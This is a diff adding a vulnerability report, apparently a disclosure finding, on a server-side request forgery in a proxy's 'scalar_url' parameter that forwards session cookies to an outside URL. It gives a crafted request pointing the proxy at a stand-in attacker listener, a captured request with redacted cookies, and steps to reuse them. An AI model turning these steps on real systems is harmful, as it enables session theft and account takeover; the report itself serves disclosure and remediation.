@@ -1,0 +1,44 @@
+1. Vulnerability: Server-Side Request Forgery (SSRF) → 0-Click Account Takeover (ATO)
+
+Parameter: scalar_url
+Severity: Critical
+
+Description:
+
+The scalar_url parameter allows the server to fetch arbitrary attacker-controlled URLs. The
+internal fetcher forwards cookies and other sensitive headers when requesting the attacker
+URL. An attacker-controlled listener captured active session cookies from the internal server,
+enabling a zero-click account takeover if those cookies represent valid sessions.
+Steps to Reproduce (high-level, authorised test only):
+
+● Host a listener URL that logs incoming requests, e.g. http://attacker-
+listener.example.com/.
+
+Trigger the proxy to fetch your listener by visiting or issuing a request to:
+
+# https://proxy.scalar.com/?&scalar_url=http://attacker-listener.example.com/
+
+● Observe the request arriving at your listener. Example of an observed request:
+
+GET / HTTP/1.1
+Host: attacker-listener.example.com
+...
+Cookie: _li_dcdm_c=[REDACTED];
+        _lc2_fpi=[REDACTED];
+        _lc2_fpi_js=[REDACTED];
+        _li_ss=[REDACTED];
+        scalar-team-uid=[REDACTED];
+        vector_visitor_id=[REDACTED]
+X-Forwarded-For: [CLIENT-IP], [INTERNAL-IP]
+Forwarded: for="[CLIENT-IP]";proto=https
+
+
+● Confirm whether captured cookies/tokens are active (ONLY in an authorised test
+environment). If active, attempt to use them in a safe, approved test account to validate
+attacker access (do not test against production or without permission).
+
+Proof / Evidence
+
+Internal server [INTERNAL-IP] contacted the attacker listener and forwarded session cookies
+(for example scalar-team-uid), proving the proxy includes sensitive headers/cookies in
+server-side fetches.
